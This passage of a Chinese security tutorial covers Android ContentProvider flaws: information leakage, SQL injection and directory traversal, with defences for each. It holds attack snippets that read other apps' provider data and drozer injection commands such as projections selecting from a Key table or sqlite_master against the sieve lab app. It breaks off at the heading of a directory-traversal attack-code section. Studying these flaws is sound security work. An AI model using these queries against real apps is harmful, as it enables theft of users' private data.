<p>使用ContentResolver对ContentProvider中的数据进行操作：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> <span class="type">ContentResolver</span> <span class="variable">resolver</span> <span class="operator">=</span> getContentResolver();</span><br><span class="line"> <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;content://com.wang.provider.myprovider/tablename&quot;</span>);</span><br><span class="line"> <span class="comment">//添加一条记录</span></span><br><span class="line"> <span class="type">ContentValues</span> <span class="variable">values</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContentValues</span>();</span><br><span class="line"> values.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;wang1&quot;</span>);</span><br><span class="line"> values.put(<span class="string">&quot;age&quot;</span>, <span class="number">28</span>);</span><br><span class="line"> resolver.insert(uri, values); </span><br><span class="line"> <span class="comment">//获取tablename表中所有记录</span></span><br><span class="line"> <span class="type">Cursor</span> <span class="variable">cursor</span> <span class="operator">=</span> resolver.query(uri, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="string">&quot;tablename data&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>(cursor.moveToNext())&#123;</span><br><span class="line">   Log.i(<span class="string">&quot;ContentTest&quot;</span>, <span class="string">&quot;tablename_id=&quot;</span>+ cursor.getInt(<span class="number">0</span>)+ <span class="string">&quot;, name=&quot;</span>+ cursor.getString(<span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//把id为1的记录的name字段值更改新为zhang1</span></span><br><span class="line"><span class="type">ContentValues</span> <span class="variable">updateValues</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContentValues</span>();</span><br><span class="line">updateValues.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;zhang1&quot;</span>);</span><br><span class="line"><span class="type">Uri</span> <span class="variable">updateIdUri</span> <span class="operator">=</span> ContentUris.withAppendedId(uri, <span class="number">2</span>);</span><br><span class="line">resolver.update(updateIdUri, updateValues, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"><span class="comment">//删除id为2的记录，即字段age</span></span><br><span class="line"><span class="type">Uri</span> <span class="variable">deleteIdUri</span> <span class="operator">=</span> ContentUris.withAppendedId(uri, <span class="number">2</span>);</span><br><span class="line">resolver.delete(deleteIdUri, <span class="literal">null</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure>

<p><strong>监听数据变化：</strong></p>
<p>如果ContentProvider的访问者需要知道数据发生的变化，可以在ContentProvider发生数据变化时调用getContentResolver().notifyChange(uri, null)来通知注册在此URI上的访问者。只给出类中监听部分的代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyProvider</span> <span class="keyword">extends</span> <span class="title class_">ContentProvider</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> Uri <span class="title function_">insert</span><span class="params">(Uri uri, ContentValues values)</span> &#123;</span><br><span class="line">     db.insert(<span class="string">&quot;tablename&quot;</span>, <span class="string">&quot;tablenameid&quot;</span>, values);</span><br><span class="line">      getContext().getContentResolver().notifyChange(uri, <span class="literal">null</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而访问者必须使用ContentObserver对数据（数据采用uri描述）进行监听，当监听到数据变化通知时，系统就会调用ContentObserver的onChange()方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">getContentResolver().registerContentObserver(Uri.parse(<span class="string">&quot;content://com.ljq.providers.personprovider/person&quot;</span>),</span><br><span class="line">        <span class="literal">true</span>, <span class="keyword">new</span> <span class="title class_">PersonObserver</span>(<span class="keyword">new</span> <span class="title class_">Handler</span>()));</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PersonObserver</span> <span class="keyword">extends</span> <span class="title class_">ContentObserver</span>&#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="title function_">PersonObserver</span><span class="params">(Handler handler)</span> &#123;</span><br><span class="line">       <span class="built_in">super</span>(handler);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onChange</span><span class="params">(<span class="type">boolean</span> selfChange)</span> &#123;</span><br><span class="line">        <span class="comment">//to do something</span></span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h3 id="（6）Content-Provider使用"><a href="#（6）Content-Provider使用" class="headerlink" title="（6）Content Provider使用"></a>（6）Content Provider使用</h3><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/6.png" alt="image-20210922094010216"></p>
<p>创建内容提供者的基本流程：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）创建一个扩展ContentProviderbaseclass的 Content Provider 类</span><br><span class="line">（<span class="number">2</span>）定义将用于访问内容的内容提供者 URI 地址</span><br><span class="line">（<span class="number">3</span>）创建自己的数据库来保存内容。通常，Android 使用 SQLite 数据库，框架需要覆盖onCreate()方法，该方法将使用 SQLite Open Helper 方法创建或打开提供者的数据库。当您的应用程序启动时，其每个内容提供程序的onCreate()处理程序在主应用程序线程上被调用</span><br><span class="line">（<span class="number">4</span>）实现内容提供者查询以执行不同的数据库特定操作</span><br><span class="line">（<span class="number">5</span>）最后使用 &lt;provider&gt; 标签在您的活动文件中注册您的内容提供者</span><br></pre></td></tr></table></figure>

<h3 id="2-Content-Provider漏洞的种类和危害"><a href="#2-Content-Provider漏洞的种类和危害" class="headerlink" title="2.Content Provider漏洞的种类和危害"></a>2.Content Provider漏洞的种类和危害</h3><p>Content Provoder漏洞大致可以分为：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/7.png" alt="image-20210922104352070"></p>
<p>Content Provider漏洞的危害：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Android中Content Provider起到在不同的进程APP之间实现共享数据的作用，通过Binder进程间通信机制以及匿名共享内存机制来实现，但是考虑到数据的安全性，我们需要设置一定的保护权限。</span><br><span class="line">Binder进程间通信机制突破了以应用程序为边界的权限控制，是安全可控的，数据的访问接口由数据的所有者来提供，数据提供方实现安全控制，决定数据的读写操作</span><br><span class="line">而content Provider组件本身提供了读取权限控制，这导致在使用过程中就会存在一些漏洞</span><br></pre></td></tr></table></figure>

<h2 id="三、Content-Provider漏洞原理分析和复现"><a href="#三、Content-Provider漏洞原理分析和复现" class="headerlink" title="三、Content Provider漏洞原理分析和复现"></a>三、Content Provider漏洞原理分析和复现</h2><h3 id="1-漏洞挖掘方法"><a href="#1-漏洞挖掘方法" class="headerlink" title="1.漏洞挖掘方法"></a>1.漏洞挖掘方法</h3><p>先检测组件的exported属性，再检测组件permission、readPermission、writePermissio对应的protectionlevel，最后再检测sdk版本</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/12.png" alt="image-20210922124628055"></p>
<h4 id="（1）查找导出Provider"><a href="#（1）查找导出Provider" class="headerlink" title="（1）查找导出Provider"></a>（1）查找导出Provider</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）反编译 apk 文件，在AndroidManifest.xml中查找显示设置了android:exported=&quot;true&quot;Content Provider</span><br><span class="line">（2）使用drozer工具，执行命令：run app.provider.info -a ddns.android.vuls</span><br></pre></td></tr></table></figure>

<h4 id="（2）查找URI"><a href="#（2）查找URI" class="headerlink" title="（2）查找URI"></a>（2）查找URI</h4><ul>
<li>反编译apk文件，在代码中查找UriMatcher.addURI，并手动拼接uri</li>
</ul>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/13.png" alt="image-20210922125010622"></p>
<p>如上，可以拼接出：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">content:<span class="comment">//ddns.vuls.AccountProvider/account</span></span><br><span class="line">content:<span class="comment">//ddns.vuls.AccountProvider/account/</span></span><br><span class="line">content:<span class="comment">//ddns.vuls.AccountProvider/account/1</span></span><br><span class="line">content:<span class="comment">//ddns.vuls.AccountProvider/account/aaa</span></span><br></pre></td></tr></table></figure>

<ul>
<li>使用drozer工具</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">执行命令 run app.provider.finduri ddns.android.vuls</span><br></pre></td></tr></table></figure>

<h4 id="（3）方法使用"><a href="#（3）方法使用" class="headerlink" title="（3）方法使用"></a>（3）方法使用</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>使用adb shell查询 </span><br><span class="line">例子：adb shell content query --uri 具体uri</span><br><span class="line"><span class="number">2.</span>使用drozer验证</span><br><span class="line">例子：run app.provider.query <span class="string">&quot;具体uri&quot;</span></span><br><span class="line"><span class="number">3.</span>编写目标代码</span><br><span class="line">例如：</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">getyouni</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    ContentResolver contentresolver=getContentResolver();</span><br><span class="line">    String[] projection=&#123;<span class="string">&quot;* from contacts--&quot;</span>&#125;;</span><br><span class="line">    <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span>Uri.parse(<span class="string">&quot;content://com.snda.youni.providers.DataStructs/message_ex&quot;</span>);</span><br><span class="line">    Cursor cursor=contentresolver.query(uri.projection,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">    String text=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span>(cursor.moveToNext())&#123;</span><br><span class="line">        text+=cursor.getString(cursor.getColumnIndex(<span class="string">&quot;display_name&quot;</span>))+<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Log.i(<span class="string">&quot;TEST&quot;</span>,text);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们下面将结合这三种方法来对一些常见的案例进行漏洞挖掘介绍</p>
<h3 id="2-信息泄露漏洞"><a href="#2-信息泄露漏洞" class="headerlink" title="2.信息泄露漏洞"></a>2.信息泄露漏洞</h3><h4 id="（1）原理介绍"><a href="#（1）原理介绍" class="headerlink" title="（1）原理介绍"></a>（1）原理介绍</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content URI是一个标志provider中的数据的URI。Content URI中包含了整个provider的以符号表示的名字(它的authority)和指向一个表的名字(一个路径)。当你调用一个客户端的方法来操作一个，provider中的一个表，指向表的contentURI是参数之一，如果对ContentProvider的权限没有做好控制，就有可能导致恶意的程序通过这种方式读取APP的敏感数据。</span><br></pre></td></tr></table></figure>

<h4 id="（2）漏洞复现"><a href="#（2）漏洞复现" class="headerlink" title="（2）漏洞复现"></a>（2）漏洞复现</h4><p><strong>案例1：盛大有你Android存在信息泄露漏洞</strong></p>
<p>目标代码：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">provider</span> <span class="attr">android:name</span>=<span class="string">&quot;.providers.YouNiProvider&quot;</span> <span class="attr">android:process</span>=<span class="string">&quot;com.snda.youni.mms&quot;</span> <span class="attr">android:authorities</span>=<span class="string">&quot;com.snda.youni.providers.DataStructs&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>攻击代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">getyouni</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    ContentResolver contentresolver=getContentResolver();</span><br><span class="line">    String[] projection=&#123;<span class="string">&quot;* from contacts--&quot;</span>&#125;;</span><br><span class="line">    <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span>Uri.parse(<span class="string">&quot;content://com.snda.youni.providers.DataStructs/message_ex&quot;</span>);</span><br><span class="line">    Cursor cursor=contentresolver.query(uri.projection,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">    String text=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span>(cursor.moveToNext())&#123;</span><br><span class="line">        text+=cursor.getString(cursor.getColumnIndex(<span class="string">&quot;display_name&quot;</span>))+<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Log.i(<span class="string">&quot;TEST&quot;</span>,text);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码分析：</p>
<p>我们可以分析目标程序的provider的进程名和授权的的URI，我们可以根据授权的URI来构建一个URI，然后通过contentresolver去读取里面的的列表名信息，这样我们就可以获取APP中的隐私数据信息。</p>
<p><strong>案例2：样例sieve.apk</strong></p>
<p>我们先向apk中添加一条数据，然后保存：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/8.png" alt="image-20210922111855304"></p>
<p>我们先使用drozer对内容提供器的路径进行扫描：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.finduris -a &lt;包名&gt;</span><br></pre></td></tr></table></figure>

<p>报错：drozer could not find or compile a required extension library</p>
<p>这是由于我们drozer2.7中代码导致的，我们需要修改相应的代码，参考网址(<a target="_blank" rel="noopener" href="https://github.com/FSecureLABS/drozer/issues/361">https://github.com/FSecureLABS/drozer/issues/361</a> )</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/9.png" alt="image-20210922111855304"></p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/10.png" alt="image-20210922111855304"></p>
<p>我们可以对敏感数据读取：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query uri</span><br></pre></td></tr></table></figure>

<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/11.png" alt="image-20210922112523603"></p>
<p>我们就成功的将我们刚才保存的账号密码信息给获取了</p>
<p>案例3：<a target="_blank" rel="noopener" href="https://mabin004.github.io/2019/04/15/Android-Download-Provider%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2018-9546: Download Provider文件头信息泄露</a></p>
<p>漏洞描述：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Download Provider运行app获取下载的http请求头，但理论上APP只能访问自己下载的文件的http请求头，但Download Provider没有做好权限配置，导致heads可以被任意读取。header中会保存一些敏感数据，例如cookie等。</span><br></pre></td></tr></table></figure>

<p>目标代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">读取header的URI为：content:<span class="comment">//download/mydownloads/download_id/headers</span></span><br></pre></td></tr></table></figure>

<p>攻击代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;content://download/mydownloads/1493/headers&quot;</span>);</span><br><span class="line"><span class="type">Cursor</span> <span class="variable">cur</span> <span class="operator">=</span> res.query(uri, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (cur != <span class="literal">null</span> &amp;&amp; cur.getCount() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(LOG_SEPARATOR);</span><br><span class="line">        sb.append(<span class="string">&quot;HEADERS FOR DOWNLOAD ID &quot;</span>).append(id).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> (cur.moveToNext()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">rowHeader</span> <span class="operator">=</span> cur.getString(cur.getColumnIndex(<span class="string">&quot;header&quot;</span>));</span><br><span class="line">            <span class="type">String</span> <span class="variable">rowValue</span> <span class="operator">=</span> cur.getString(cur.getColumnIndex(<span class="string">&quot;value&quot;</span>));</span><br><span class="line">            sb.append(rowHeader).append(<span class="string">&quot;: &quot;</span>).append(rowValue).append(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        log(sb.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (cur != <span class="literal">null</span>)</span><br><span class="line">        cur.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于header的URI并未做一些防护措施，我们可以将download_id取具体的值，然后来获取里面的具体信息</p>
<h4 id="（3）安全防护"><a href="#（3）安全防护" class="headerlink" title="（3）安全防护"></a>（3）安全防护</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>minSdkVersion不低于<span class="number">9</span></span><br><span class="line"><span class="number">2.</span>不向外部app提供数据的私有content provider显示设置exported=”<span class="literal">false</span>”，避免组件暴露(编译api小于<span class="number">17</span>时更应注意此点)</span><br><span class="line"><span class="number">3.</span>内部app通过content provid交换数据时，设置protectionLevel=”signature”验证签名</span><br><span class="line"><span class="number">4.</span>公开的content provider确保不存储敏感数据</span><br><span class="line"></span><br><span class="line">针对权限保护绕过防御措施：</span><br><span class="line"><span class="number">1.</span>使用Context.checkCallingPermission()和Context.enforceCallingPermission()来确保调用者拥有相应的权限，防止串谋攻击(confused deputy)。</span><br><span class="line"><span class="number">2.</span>可以使用如下函数，获取应用的permission保护级别是否与系统中已定义的permission保护级别一致。如果不一致，则抛出异常。</span><br></pre></td></tr></table></figure>

<h3 id="3-SQL注入漏洞"><a href="#3-SQL注入漏洞" class="headerlink" title="3.SQL注入漏洞"></a>3.SQL注入漏洞</h3><h4 id="（1）原理介绍-1"><a href="#（1）原理介绍-1" class="headerlink" title="（1）原理介绍"></a>（1）原理介绍</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">对Content Provider进行增删改查操作时，程序没有对用户的输入进行过滤，未采用参数化查询的方式，可能会导致sql注入攻击。</span><br><span class="line">所谓的SQL注入攻击指的是攻击者可以精心构造selection参数、projection参数以及其他有效的SQL语句组成部分，实现在未授权的情况下从Content Provider获取更多信息。应该避免使用SQLiteDatabase.rawQuery()进行查询，而应该使用编译好的参数化语句。使用预编译好的语句比如SQLiteStatement，不仅可以避免SQL注入，而且操作性能也大幅提高，因为其不用每次执行都进行解析。</span><br><span class="line">另外一种方式是使用query(),insert(),update(),和delete()方法，因为这些函数也提供了参数化的语句。预编译的参数化语句，问号处可以插入或者使bindString()绑定值。从而避免SQL注入攻击。</span><br></pre></td></tr></table></figure>

<h4 id="（2）漏洞复现-1"><a href="#（2）漏洞复现-1" class="headerlink" title="（2）漏洞复现"></a>（2）漏洞复现</h4><p><strong>案例1：<a target="_blank" rel="noopener" href="http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-086899">安全管家客户端存在SQL注入攻击</a></strong></p>
<p>漏洞说明：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Android版安全管家客户端contentprovider uri配置不当，导致sql注入，使得任何应用可不需要root权限下，获得和修改数据库中数据。</span><br></pre></td></tr></table></figure>

<p>Androidmanifest文件中定义的provider：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/14.png" alt="image-20210922112523603"></p>
<p>使用drozer扫描客户端程序存在的contentProvider uri:</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/15.png" alt="image-20210922112523603"></p>
<p>搜索到对外暴露可访问的uri:</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/16.png" alt="image-20210922112523603"></p>
<p>newapp.db结构：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/17.png" alt="image-20210922112523603"></p>
<p>查看新安装应用的包名：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/18.png" alt="image-20210922112523603"></p>
<p>查看白名单：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/19.png" alt="image-20210922112523603"></p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/20.png" alt="image-20210922112523603"></p>
<p><strong>案例2：样本sieve</strong></p>
<p>我们使用drozer扫描注入的位置：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.injection -a &lt;包名&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/21.png" alt="image-20210922112523603"></p>
<p>然后我们执行以下命令，发现返回了报错信息，接着构造sql获取敏感数据</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content:<span class="comment">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;&#x27;&quot;</span></span><br><span class="line">run app.provider.query content:<span class="comment">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot; * from Key;--+&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/22.png" alt="image-20210922112523603"></p>
<p>列出所有表信息：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content:<span class="comment">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM SQLITE_MASTER WHERE type=&#x27;table&#x27;;--&quot; </span></span><br></pre></td></tr></table></figure>

<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/23.png" alt="image-20210922112523603"></p>
<p>获取具体表信息</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content:<span class="comment">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM Key;--&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/24.png" alt="image-20210922112523603"></p>
<p>列出该app的表信息</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.sqltables -a  com.mwr.example.sieve</span><br></pre></td></tr></table></figure>

<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/25.png" alt="image-20210922112523603"></p>
<p>案例3：<a target="_blank" rel="noopener" href="https://mabin004.github.io/2019/04/15/Android-Download-Provider%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2018-9493: Download Provider SQL注入</a></p>
<p>漏洞分析：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Download Provider中的以下columns是不允许被外部访问的，例如CookieData，但是利用SQL注入漏洞可以绕过这个限制。</span><br><span class="line">projection参数存在注入漏洞，结合二分法可以爆出某些columns字段的内容。</span><br></pre></td></tr></table></figure>

<p>目标代码：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/26.png" alt="image-20210922131649440"></p>
<p>攻击代码：</p>
<p>详细可以参考该作者博客：(<a target="_blank" rel="noopener" href="https://mabin004.github.io/2019/04/15/Android-Download-Provider%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">https://mabin004.github.io/2019/04/15/Android-Download-Provider%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a>)</p>
<h4 id="（3）安全防护-1"><a href="#（3）安全防护-1" class="headerlink" title="（3）安全防护"></a>（3）安全防护</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>实现健壮的服务端校验</span><br><span class="line"><span class="number">2.</span>使用参数化查询语句，比如SQLiteStatement</span><br><span class="line"><span class="number">3.</span>避免使用rawQuery()</span><br><span class="line"><span class="number">4.</span>过滤用户的输入</span><br></pre></td></tr></table></figure>

<h3 id="4-目录遍历漏洞"><a href="#4-目录遍历漏洞" class="headerlink" title="4.目录遍历漏洞"></a>4.目录遍历漏洞</h3><h4 id="（1）原理介绍-2"><a href="#（1）原理介绍-2" class="headerlink" title="（1）原理介绍"></a>（1）原理介绍</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Android Content Provider存在文件目录遍历安全漏洞，该漏洞源于对外暴露Content Provider组件的应用，没有对Content Provider组件的访问进行权限控制和对访问的目标文件的Content Query Uri进行有效判断，攻击者利用该应用暴露的Content Provider的openFile()接口进行文件目录遍历以达到访问任意可读文件的目的</span><br></pre></td></tr></table></figure>

<p>漏洞触发的前提条件：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">对外暴露的Content Provider组件实现了openFile()接口</span><br><span class="line">没有对所访问的目标文件Uri进行有效判断，如没有过滤限制如“../”可实现任意可读文件的访问的Content Query Uri</span><br></pre></td></tr></table></figure>

<h4 id="（2）漏洞复现-2"><a href="#（2）漏洞复现-2" class="headerlink" title="（2）漏洞复现"></a>（2）漏洞复现</h4><p>案例1：<a target="_blank" rel="noopener" href="http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2013-044407">赶集网Android客户端Content Provider组件任意文件读取漏洞</a></p>
<p>漏洞分析：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">赶集网客户端APP的实现中定义了一个可以访问本地文件的Content Provider组件，默认的android:exported=<span class="string">&quot;true&quot;</span>,对应com.ganji.android.jobs.html5.LocalFileContentProvider，该Provider实现了openFile()接口，通过此接口可以访问内部存储app_webview目录下的数据，由于后台未能对目标文件地址进行有效判断，可以通过<span class="string">&quot;../&quot;</span>实现目录跨越，实现对任意私有数据的访问（当然，也可以访问任意外部存储数据，只是我们更关心私有敏感数据）。</span><br></pre></td></tr></table></figure>

<p>攻击代码：</p>
